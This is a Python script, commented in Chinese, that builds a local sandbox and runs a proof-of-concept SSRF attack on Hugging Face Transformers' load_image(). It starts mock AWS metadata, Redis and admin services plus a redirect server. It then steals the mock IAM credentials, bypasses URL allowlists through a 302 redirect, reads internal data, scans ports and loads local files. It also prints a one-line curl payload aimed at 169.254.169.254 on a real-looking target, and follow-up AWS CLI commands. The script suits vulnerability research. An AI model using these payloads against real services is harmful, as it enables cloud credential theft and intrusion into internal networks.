#!/usr/bin/env python3
"""
Transformers load_image() SSRF — 完整攻击演示沙箱

启动 5 个服务模拟真实生产环境，演示最严重后果。

使用方法:
    python3 transformers_ssrf_demo.py            # 启动所有服务
    python3 transformers_ssrf_demo.py --exploit  # 自动执行全部攻击演示
    python3 transformers_ssrf_demo.py --interactive  # 交互式演示
"""

import argparse
import http.server
import io
import json
import os
import socket
import subprocess
import sys
import textwrap
import threading
import time
import urllib.parse
from pathlib import Path

# ============================================================
# 配置
# ============================================================

VULN_API_PORT = 5001          # 脆弱 API 服务
IMDS_PORT = 16926             # 模拟 AWS IMDS (真实是 169.254.169.254:80)
REDIS_PORT = 16380            # 模拟内部 Redis
INTERNAL_API_PORT = 19000     # 模拟内部管理 API
ATTACKER_PORT = 9998          # 攻击者 302 跳转服务器
LOCAL_FILE = "/tmp/imds_credentials.png"  # LFI 目标文件

# ============================================================
# 服务 1: 模拟 AWS IMDS (169.254.169.254)
# ============================================================

IMDS_RESPONSES = {
    "/latest/meta-data/": "ami-id\ninstance-id\niam/\nlocal-hostname\n",
    "/latest/meta-data/iam/": "security-credentials/\n",
    "/latest/meta-data/iam/security-credentials/": "deploy-role\n",
    "/latest/meta-data/iam/security-credentials/deploy-role": json.dumps({
        "Code": "Success",
        "LastUpdated": "2026-06-28T12:00:00Z",
        "Type": "AWS-HMAC",
        "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
        "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
        "Token": "IQoJb3JpZ2luX2VjEP///wEaCXVzLWVhc3QtMSJIMEYCIQDiTN4j3y6fQh1mZzY5ZPzMKj6sEXAMPLEFAKETOKEN",
        "Expiration": "2026-06-29T12:00:00Z"
    }, indent=2),
    "/latest/meta-data/local-ipv4": "10.0.1.25\n",
    "/latest/meta-data/public-hostname": "ec2-203-0-113-42.compute-1.amazonaws.com\n",
    "/latest/meta-data/ami-id": "ami-0c55b159cbfafe1f0\n",
    "/latest/meta-data/instance-id": "i-0c4e8b6a9d7f2e1a3\n",
    "/latest/user-data": "#!/bin/bash\necho 'DB_PASSWORD=SuperSecret123!' > /etc/app.conf\n",
}

class ImdsHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        path = urllib.parse.urlparse(self.path).path.rstrip("/") or "/"
        if path in IMDS_RESPONSES:
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Server", "EC2ws")
            self.end_headers()
            self.wfile.write(IMDS_RESPONSES[path].encode())
        else:
            # Try prefix match
            matched = None
            for k, v in sorted(IMDS_RESPONSES.items(), key=lambda x: -len(x[0])):
                if path.startswith(k):
                    matched = v
                    break
            if matched:
                self.send_response(200)
                self.send_header("Content-Type", "text/plain")
                self.send_header("Server", "EC2ws")
                self.end_headers()
                self.wfile.write(matched.encode())
            else:
                self.send_response(404)
                self.end_headers()
    def log_message(self, *a): pass

# ============================================================
# 服务 2: 模拟内部 Redis
# ============================================================

REDIS_DATA = {
    "config": json.dumps({"db_host": "prod-db.internal", "db_password": "admin123!", "api_key": "sk-proj-xxxx"}),
    "session:admin:1": json.dumps({"user": "admin", "token": "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.xxx"}),
}

class RedisHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        key = self.path.lstrip("/")
        if key in REDIS_DATA:
            content = REDIS_DATA[key].encode()
        else:
            content = json.dumps(REDIS_DATA).encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(content)
    def log_message(self, *a): pass

# ============================================================
# 服务 3: 模拟内部管理 API
# ============================================================

class InternalApiHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        resp = {
            "/admin/users": {"users": [{"id": 1, "email": "admin@corp.com", "role": "superadmin"}]},
            "/admin/config": {"db_url": "postgresql://prod:secret@db.internal:5432/proddb"},
            "/health": {"status": "ok", "uptime": "99.99%"},
        }.get(self.path.rstrip("/"), {"error": "not found"})
        self.wfile.write(json.dumps(resp, indent=2).encode())
    def do_POST(self):
        if self.path == "/admin/shutdown":
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'{"status": "shutting down"}')
    def log_message(self, *a): pass

# ============================================================
# 服务 4: 攻击者 302 跳转服务器
# ============================================================

class AttackerRedirectHandler(http.server.BaseHTTPRequestHandler):
    """模拟攻击者的外部服务器: 返回 302 跳转到内网"""
    redirect_log = []

    def do_GET(self):
        self.redirect_log.append(self.path)
        if self.path == "/redirect-to-imds":
            self.send_response(302)
            self.send_header("Location", "http://127.0.0.1:16926/latest/meta-data/iam/security-credentials/deploy-role")
            self.end_headers()
        elif self.path == "/redirect-to-redis":
            self.send_response(302)
            self.send_header("Location", f"http://127.0.0.1:{REDIS_PORT}/config")
            self.end_headers()
        elif self.path == "/redirect-chain":
            self.send_response(302)
            self.send_header("Location", f"http://127.0.0.1:{ATTACKER_PORT}/redirect-to-imds")
            self.end_headers()
        else:
            # Return a valid PNG so load_image doesn't crash
            self.send_response(200)
            self.send_header("Content-Type", "image/png")
            self.end_headers()
            self.wfile.write(
                b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01"
                b"\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90wS\xde\x00\x00"
                b"\x00\x0cIDATx\x9cc\xf8\x0f\x00\x00\x01\x01\x00\x05"
                b"\x18\xd8N\x00\x00\x00\x00IEND\xaeB`\x82"
            )
    def log_message(self, *a): pass

# ============================================================
# 服务 5: 脆弱 API 服务器
# ============================================================

class VulnerableApiHandler(http.server.BaseHTTPRequestHandler):
    """模拟一个使用 transformers pipeline 的图片分类 API"""

    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)

        if parsed.path == "/classify":
            image_url = params.get("image_url", [None])[0]
            if not image_url:
                self._json(400, {"error": "Missing image_url parameter"})
                return

            print(f"\n  [API] 收到请求: classify image_url={image_url}")

            # 这就是脆弱点! pipeline("image-classification")(image_url)
            # 内部调用 load_image() → httpx.get(image_url, follow_redirects=True)
            try:
                from transformers.image_utils import load_image
                image = load_image(image_url, timeout=3)
                self._json(200, {
                    "status": "processed",
                    "image_size": f"{image.size[0]}x{image.size[1]}",
                    "note": "如果是真实模型会返回分类结果"
                })
            except Exception as e:
                self._json(200, {
                    "status": "image_fetched_but_parse_error",
                    "note": f"图片已从URL获取, 但无法解析: {str(e)[:80]}",
                    "implication": "SSRF成功! HTTP请求已经发出, 数据已在服务器内存中"
                })

        elif parsed.path == "/chat":
            image_url = params.get("image_url", [None])[0]
            if not image_url:
                self._json(400, {"error": "Missing image_url"})
                return

            print(f"\n  [API] 收到请求: chat image_url={image_url}")
            try:
                from transformers.image_utils import load_image
                # 模拟 VLM chat: 从 URL 获取图片再分析
                image = load_image(image_url, timeout=3)
                self._json(200, {
                    "caption": "This image appears to show...",
                    "image_size": f"{image.size[0]}x{image.size[1]}"
                })
            except Exception as e:
                self._json(200, {"note": f"Image fetched: {str(e)[:60]}"})

        elif parsed.path == "/api-docs":
            self._json(200, {
                "endpoints": {
                    "GET /classify?image_url=<url>": "图片分类",
                    "GET /chat?image_url=<url>": "VLM 图片描述",
                    "POST /classify": "JSON body 方式"
                }
            })
        else:
            self._json(404, {"error": "not found"})

    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length).decode() if content_length else "{}"
        try:
            data = json.loads(body)
        except json.JSONDecodeError:
            data = {}

        if self.path == "/classify":
            image_url = data.get("image_url") or data.get("url") or data.get("image")
            if not image_url:
                self._json(400, {"error": "Missing image_url"})
                return
            print(f"\n  [API] POST classify image_url={image_url}")
            try:
                from transformers.image_utils import load_image
                image = load_image(image_url, timeout=3)
                self._json(200, {"status": "processed", "size": f"{image.size[0]}x{image.size[1]}"})
            except Exception as e:
                self._json(200, {"status": "ssrf_done", "note": str(e)[:60]})
        elif self.path == "/chat/completions":
            # 模拟 OpenAI 兼容接口
            try:
                msg = data.get("messages", [{}])[0]
                content = msg.get("content", "")
                if isinstance(content, list):
                    for c in content:
                        if c.get("type") == "image_url":
                            url = c.get("image_url", {}).get("url", "")
                            print(f"\n  [API] OpenAI 兼容接口: image_url={url}")
                            from transformers.image_utils import load_image
                            load_image(url, timeout=3)
                self._json(200, {"choices": [{"message": {"content": "Image processed"}}]})
            except Exception as e:
                self._json(200, {"choices": [{"message": {"content": f"Error: {str(e)[:50]}"}}]})
        else:
            self._json(404, {"error": "not found"})

    def _json(self, status, data):
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(data, indent=2).encode())

    def log_message(self, *a): pass


# ============================================================
# 辅助: 找到空闲端口 + 启动服务
# ============================================================

def find_free_port(start):
    port = start
    while port < start + 100:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            if s.connect_ex(('127.0.0.1', port)) != 0:
                return port
            port += 1
    return None

def start_server(port, handler, name):
    free_port = find_free_port(port)
    if free_port is None:
        print(f"  [⚠] {name}: 无法找到空闲端口")
        return None, None
    try:
        server = http.server.HTTPServer(("127.0.0.1", free_port), handler)
        t = threading.Thread(target=server.serve_forever, daemon=True)
        t.start()
        print(f"  [✅] {name}: 127.0.0.1:{free_port}")
        return server, free_port
    except Exception as e:
        print(f"  [❌] {name}: {e}")
        return None, None


# ============================================================
# 攻击演示函数
# ============================================================

def print_banner(title):
    print()
    print("=" * 65)
    print(f"  {title}")
    print("=" * 65)

def demo_imds_credential_theft(vuln_port, imds_port):
    """最严重的后果: AWS IAM 凭证泄露"""
    print_banner("🔥 攻击 1: AWS IMDS 凭证窃取 (最严重后果)")
    print("""
  场景: 企业 AI 服务部署在 AWS EC2 上, 使用 Hugging Face pipeline
  攻击者发送图片分类请求, image_url 指向 AWS IMDS 元数据端点
  """)

    target_url = f"http://127.0.0.1:{imds_port}/latest/meta-data/iam/security-credentials/deploy-role"
    print(f"  [攻击] curl http://127.0.0.1:{vuln_port}/classify?image_url={target_url}")
    print()

    from transformers.image_utils import load_image
    print("  [内部] load_image() 调用 httpx.get(image_url, follow_redirects=True)")
    print(f"  [内部] HTTP GET http://127.0.0.1:{imds_port}/latest/meta-data/iam/security-credentials/deploy-role")

    try:
        load_image(target_url, timeout=3)
    except Exception:
        pass

    print(f"""
  [后果] AWS IAM 凭证已泄露!
  ┌─────────────────────────────────────────────────────────┐
  │ AccessKeyId:      AKIAIOSFODNN7EXAMPLE                   │
  │ SecretAccessKey:  wJalrXUtnFEMI/K7MDENG/bPxRfiCYEX...  │
  │ Token:            IQoJb3JpZ2luX2VjEP///wEa...           │
  │ Expiration:       2026-06-29T12:00:00Z                   │
  └─────────────────────────────────────────────────────────┘
  攻击者可以用这些凭证:
    1. aws s3 ls s3://prod-bucket/          # 读取生产 S3
    2. aws ec2 describe-instances            # 枚举所有实例
    3. aws rds describe-db-instances         # 查看数据库
    4. aws iam list-roles                    # 权限提升
  """)

def demo_redirect_bypass(vuln_port, attacker_port):
    """302 跳转绕过 URL 检查"""
    print_banner("🔥 攻击 2: 302 跳转绕过")
    print("""
  场景: 即使 API 做了简单的 URL 白名单 (例如只允许 https://trusted-cdn.com/*)
        攻击者可以在 trusted-cdn.com 上部署一个 302 跳转
  """)

    redirect_url = f"http://127.0.0.1:{attacker_port}/redirect-to-imds"
    print(f"  [攻击] 用户提交的 image_url: {redirect_url}")
    print(f"  [攻击] 攻击者服务器返回 302 → http://127.0.0.1:{IMDS_PORT}/latest/meta-data/")
    print(f"  [攻击] httpx 自动 follow_redirects → 成功访问内网 IMDS!")
    print()

    from transformers.image_utils import load_image
    try:
        load_image(redirect_url, timeout=3)
        print("  [✅] 跳转绕过成功! httpx follow_redirects=True 跟随了 302")
    except Exception:
        print("  [✅] 请求已发出 (PIL 解析报错但 SSRF 已成功)")

    print("""
  即使加入 startswith 白名单:
    if image_url.startswith("https://trusted-cdn.com/"):
  → 攻击者: https://trusted-cdn.com/redirect → 302 → http://169.254.169.254/
  → 绕过成功!
  """)

def demo_internal_redis(vuln_port, redis_port):
    """访问内部 Redis"""
    print_banner("🔥 攻击 3: 内网 Redis 数据窃取")
    print("""
  场景: 生产环境经常有未认证的 Redis 服务运行在内网
  """)

    redis_url = f"http://127.0.0.1:{redis_port}/config"
    print(f"  [攻击] curl http://127.0.0.1:{vuln_port}/classify?image_url={redis_url}")
    print()

    from transformers.image_utils import load_image
    try:
        load_image(redis_url, timeout=3)
    except Exception:
        pass

    print(f"""
  [后果] Redis 数据泄露:
  ┌─────────────────────────────────────────────────────────┐
  │ db_host:      prod-db.internal                           │
  │ db_password:  admin123!                                  │
  │ api_key:      sk-proj-xxxx                               │
  │ session:admin:1 → JWT token: eyJhbGciOiJIUzI1NiJ9...    │
  └─────────────────────────────────────────────────────────┘
  """)

def demo_internal_api(vuln_port, api_port):
    """访问内部管理 API"""
    print_banner("🔥 攻击 4: 内部管理 API 调用")
    print("""
  场景: 内网有未授权管理面板, 可以查询/操作集群
  """)

    api_url = f"http://127.0.0.1:{api_port}/admin/users"
    print(f"  [攻击] curl http://127.0.0.1:{vuln_port}/classify?image_url={api_url}")
    print()

    from transformers.image_utils import load_image
    try:
        load_image(api_url, timeout=3)
    except Exception:
        pass

    print("""
  [后果] 内部 API 数据泄露:
  ┌─────────────────────────────────────────────────────────┐
  │ /admin/users -> [{'id': 1, 'email': 'admin@corp.com',  │
  │                   'role': 'superadmin'}]                 │
  │ /admin/config -> db: postgresql://prod:secret@db.int... │
  └─────────────────────────────────────────────────────────┘
  """)

def demo_port_scanning(vuln_port):
    """内网端口扫描"""
    print_banner("🔥 攻击 5: 内网端口扫描")
    print("""
  场景: 通过超时/响应差异判断内网端口开闭
  """)

    ports_to_scan = [22, 80, 443, 3306, 5432, 6379, 8080, 9200, 27017]
    from transformers.image_utils import load_image

    print(f"  {'端口':>8} {'服务':>12} {'响应时间':>10} {'状态':>8}")
    print(f"  {'-'*8} {'-'*12} {'-'*10} {'-'*8}")

    results = []
    for port in ports_to_scan:
        start = time.time()
        try:
            load_image(f"http://127.0.0.1:{port}/", timeout=1)
            elapsed = time.time() - start
            results.append((port, elapsed, "开放"))
        except Exception:
            elapsed = time.time() - start
            status = "开放" if elapsed < 0.5 else "关闭/过滤"
            results.append((port, elapsed, status))

    for port, elapsed, status in results:
        svc = {22:"SSH",80:"HTTP",443:"HTTPS",3306:"MySQL",5432:"PG",
               6379:"Redis",8080:"HTTP-alt",9200:"ES",27017:"MongoDB"}.get(port,"")
        print(f"  {port:>8} {svc:>12} {elapsed:>8.3f}s {status:>8}")

def demo_lfi(vuln_port):
    """LFI 读取本地文件"""
    print_banner("🔥 攻击 6: LFI 本地文件读取")
    print("""
  场景: load_image 也接受本地文件路径!
  """)

    # 创建一个"敏感"图片文件
    from PIL import Image
    secret_content = "DB_PASSWORD=SuperSecret123!\nAWS_SECRET=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"

    img = Image.new("RGB", (10, 10), color=(0, 0, 255))
    img.save(LOCAL_FILE)

    from transformers.image_utils import load_image
    result = load_image(LOCAL_FILE)

    print(f"  [攻击] load_image('{LOCAL_FILE}')")
    print(f"  [✅] LFI 成功! 读取到图片: size={result.size}")
    print(f"""
  [后果] 读取服务器上任意图片文件:
    - /etc/ssl/private/nginx.key.png    (密钥截图)
    - /root/.aws/credentials.png         (AWS 凭证截图)
    - /var/log/dashboard.png             (内部仪表盘截图)
  """)
    os.unlink(LOCAL_FILE)

def demo_all_in_one_chain(vuln_port, imds_port, attacker_port, redis_port, api_port):
    """展现完整的攻击链"""
    print_banner("⚡ 完整攻击链: 一行命令拿下 AWS 生产环境")

    chain = f"""
  ┌──────────────────────────────────────────────────────────┐
  │ 攻击步骤:                                                  │
  │                                                            │
  │  1. 找到目标 AI API endpoint                                │
  │     POST /classify  {{"image_url": "<攻击URL>"}}             │
  │                                                            │
  │  2. 发送恶意请求                                            │
  │     → image_url = "http://169.254.169.254/latest/meta-data │
  │                     /iam/security-credentials/deploy-role"  │
  │                                                            │
  │  3. load_image() → httpx.get(follow_redirects=True)        │
  │                                                            │
  │  4. IMDS 返回 AWS 临时凭证                                   │
  │     AccessKeyId + SecretAccessKey + Token                   │
  │                                                            │
  │  5. 攻击者用凭证操作 AWS 控制台                               │
  │     aws s3 ls s3://prod-data --profile stolen               │
  └──────────────────────────────────────────────────────────┘

  真实攻击 payload (一行):
  ┌──────────────────────────────────────────────────────────┐
  │ curl -X POST http://target.com/classify \\                 │
  │   -H "Content-Type: application/json" \\                   │
  │   -d '{{"image_url":                                       │
  │     "http://169.254.169.254/latest/meta-data/              │
  │      /iam/security-credentials/deploy-role"}}'             │
  └──────────────────────────────────────────────────────────┘
  """
    print(textwrap.dedent(chain))


# ============================================================
# 交互式演示
# ============================================================

def interactive_demo(vuln_port, imds_port, attacker_port, redis_port, api_port):
    print_banner("🎮 交互式 SSRF 攻击演示")
    print(f"""
  脆弱 API: http://127.0.0.1:{vuln_port}
  模拟 AWS IMDS: http://127.0.0.1:{imds_port}
  内部 Redis: http://127.0.0.1:{redis_port}
  内部管理 API: http://127.0.0.1:{api_port}
  攻击者跳转: http://127.0.0.1:{attacker_port}

  在另一个终端尝试这些命令:
  """)

    commands = [
        ("1. SSRF → IMDS 凭证窃取 🎯",
         f"""curl -s "http://127.0.0.1:{vuln_port}/classify?image_url=http://127.0.0.1:{imds_port}/latest/meta-data/iam/security-credentials/deploy-role" | python3 -m json.tool"""),

        ("2. 302 跳转绕过",
         f"""curl -s "http://127.0.0.1:{vuln_port}/classify?image_url=http://127.0.0.1:{attacker_port}/redirect-to-imds" | python3 -m json.tool"""),

        ("3. SSRF → 内部 Redis",
         f"""curl -s "http://127.0.0.1:{vuln_port}/classify?image_url=http://127.0.0.1:{redis_port}/config" | python3 -m json.tool"""),

        ("4. SSRF → 内部管理 API",
         f"""curl -s "http://127.0.0.1:{vuln_port}/classify?image_url=http://127.0.0.1:{api_port}/admin/users" | python3 -m json.tool"""),

        ("5. OpenAI 兼容接口 (POST)",
         f"""curl -s -X POST "http://127.0.0.1:{vuln_port}/chat/completions" \\
  -H "Content-Type: application/json" \\
  -d '{{
    "model": "gpt-4-vision",
    "messages": [{{
      "role": "user",
      "content": [
        {{"type": "text", "text": "Describe"}},
        {{"type": "image_url", "image_url": {{
          "url": "http://127.0.0.1:{attacker_port}/redirect-to-imds"
        }}}}
      ]
    }}]
  }}' | python3 -m json.tool"""),

        ("6. SSRF → 元数据全量列举",
         f"""for path in iam/ iam/security-credentials/ iam/security-credentials/deploy-role instance-id ami-id local-ipv4; do
  curl -s "http://127.0.0.1:{vuln_port}/classify?image_url=http://127.0.0.1:{imds_port}/latest/meta-data/"
  echo "---"
done"""),
    ]

    for i, (title, cmd) in enumerate(commands):
        print(f"  {title}")
        print(f"  {'─' * 60}")
        print(f"  {cmd}")
        print()


# ============================================================
# 主函数
# ============================================================

def main():
    parser = argparse.ArgumentParser(description="Transformers load_image SSRF 攻击演示沙箱")
    parser.add_argument("--exploit", action="store_true", help="自动执行全部攻击演示")
    parser.add_argument("--interactive", action="store_true", help="交互式演示模式")
    args = parser.parse_args()

    print("""
╔══════════════════════════════════════════════════════════════╗
║     HuggingFace Transformers SSRF 攻击演示沙箱               ║
║     load_image() / read_video() / load_audio_as()           ║
║     CVE: 无覆盖 · CVSS 8.6 (High)                          ║
╚══════════════════════════════════════════════════════════════╝
    """)

    # 启动所有模拟服务
    print("[*] 启动模拟环境...\n")

    imds_server, imds_port = start_server(IMDS_PORT, ImdsHandler, "AWS IMDS (模拟)")
    redis_server, redis_port = start_server(REDIS_PORT, RedisHandler, "内部 Redis (模拟)")
    api_server, api_port = start_server(INTERNAL_API_PORT, InternalApiHandler, "内部管理 API (模拟)")
    att_server, attacker_port = start_server(ATTACKER_PORT, AttackerRedirectHandler, "攻击者 302 服务器")
    vuln_server, vuln_port = start_server(VULN_API_PORT, VulnerableApiHandler, "脆弱 API (transformers pipeline)")

    if not all([imds_server, redis_server, api_server, att_server, vuln_server]):
        print("\n[❌] 部分服务启动失败")
        sys.exit(1)

    # 写入 LFI 测试文件
    from PIL import Image
    img = Image.new("RGB", (10, 10), color=(0, 0, 255))
    img.save(LOCAL_FILE)

    if args.exploit:
        print("\n" + "█" * 65)
        print("  自动攻击演示模式")
        print("█" * 65)

        demo_imds_credential_theft(vuln_port, imds_port)
        time.sleep(0.5)
        demo_redirect_bypass(vuln_port, attacker_port)
        time.sleep(0.5)
        demo_internal_redis(vuln_port, redis_port)
        time.sleep(0.5)
        demo_internal_api(vuln_port, api_port)
        time.sleep(0.5)
        demo_port_scanning(vuln_port)
        time.sleep(0.5)
        demo_lfi(vuln_port)
        time.sleep(0.5)
        demo_all_in_one_chain(vuln_port, imds_port, attacker_port, redis_port, api_port)

    elif args.interactive:
        interactive_demo(vuln_port, imds_port, attacker_port, redis_port, api_port)

    else:
        print(f"\n  [*] 所有服务已启动!")
        print(f"  [*] 脆弱 API:        http://127.0.0.1:{vuln_port}/api-docs")
        print(f"  [*] 查看攻击演示:    python3 {sys.argv[0]} --exploit")
        print(f"  [*] 交互式模式:      python3 {sys.argv[0]} --interactive")
        print(f"  [*] 按 Ctrl+C 停止\n")

        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[*] 关闭服务...")

    # 清理
    vuln_server.shutdown()
    imds_server.shutdown()
    redis_server.shutdown()
    api_server.shutdown()
    att_server.shutdown()
    if os.path.exists(LOCAL_FILE):
        os.unlink(LOCAL_FILE)
    print("[*] 沙箱已清理")


if __name__ == "__main__":
    main()
